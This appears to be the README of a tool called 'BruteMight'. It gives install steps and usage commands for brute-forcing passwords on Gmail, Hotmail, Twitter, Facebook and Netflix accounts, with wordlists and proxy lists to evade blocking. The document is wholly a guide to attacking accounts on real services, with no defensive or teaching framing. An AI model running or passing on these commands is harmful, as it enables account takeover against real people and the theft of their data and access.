# BruteMight
## install :
```bash
sudo apt install python3 python3-pip

pip3 install proxylist

pip3 install mechanize
```


# Usage:

## BruteForce Gmail Attack
```bash
python3 Brute_Force.py -g Account@gmail.com -l File_list

python3 Brute_Force.py -g Account@gmail.com -p Password_Single
```


## BruteForce Hotmail Attack
```bash
python3 Brute_Force.py -t Account@hotmail.com -l File_list

python3 Brute_Force.py -t Account@hotmail.com -p Password_Single
```


## BruteForce Twitter Attack

```bash
python3 Brute_Force.py -T Account_Twitter -l File_list
python3 Brute_Force.py -T Account_Twitter -l File_list -X proxy-list.txt

```
## BruteForce Facebook Attack

```bash
python3 Brute_Force.py -f Account_facebook -l File_list
python3 Brute_Force.py -f Account_facebook -l File_list -X proxy-list.txt
```
## BruteForce Netflix Attack

```bash
VPN NameOfVpn
Start On Vpn
python3 Brute_Force.py -n Account_Netflix -l File_list
python3 Brute_Force.py -n Account_Netflix -l File_list -X proxy-list.txt

```



